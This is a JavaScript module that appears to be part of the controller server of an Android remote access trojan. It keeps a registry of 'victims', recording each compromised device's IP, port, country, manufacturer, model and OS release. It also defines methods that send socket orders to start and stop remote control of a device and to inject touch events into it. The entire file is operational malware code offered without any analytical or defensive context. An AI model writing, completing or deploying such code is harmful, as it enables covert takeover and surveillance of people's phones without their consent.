 var Victim = function(socket, ip, port, country, manf, model, release) {
     this.socket = socket;
     this.ip = ip;
     this.port = port;
     this.country = country;
     this.manf = manf;
     this.model = model;
     this.release = release;
     this.remoteControlActive = false;
 };

 // Remote Control Methods
 Victim.prototype.startRemoteControl = function() {
     if (this.socket && this.socket.connected) {
         this.socket.emit('order', {
             order: 'x0000rc',
             extra: 'start'
         });
         this.remoteControlActive = true;
         return true;
     }
     return false;
 };

 Victim.prototype.stopRemoteControl = function() {
     if (this.socket && this.socket.connected) {
         this.socket.emit('order', {
             order: 'x0000rc',
             extra: 'stop'
         });
         this.remoteControlActive = false;
         return true;
     }
     return false;
 };

 Victim.prototype.sendTouchEvent = function(x, y, action) {
     if (this.socket && this.socket.connected && this.remoteControlActive) {
         this.socket.emit('order', {
             order: 'x0000rc',
             extra: 'touch',
             x: x,
             y: y,
             action: action
         });
         return true;
     }
     return false;
 };





 class Victims {
     constructor() {
         this.victimList = {};
         this.instance = this;
     }

     addVictim(socket, ip, port, country, manf, model, release, id) {
         var victim = new Victim(socket, ip, port, country, manf, model, release);
         this.victimList[id] = victim;
     }

     getVictim(id) {
         if (this.victimList[id] != null)
             return this.victimList[id];

         return -1;
     }

     rmVictim(id) {
         delete this.victimList[id];
     }

     getVictimList() {
         return this.victimList;
     }

 }



 module.exports = new Victims();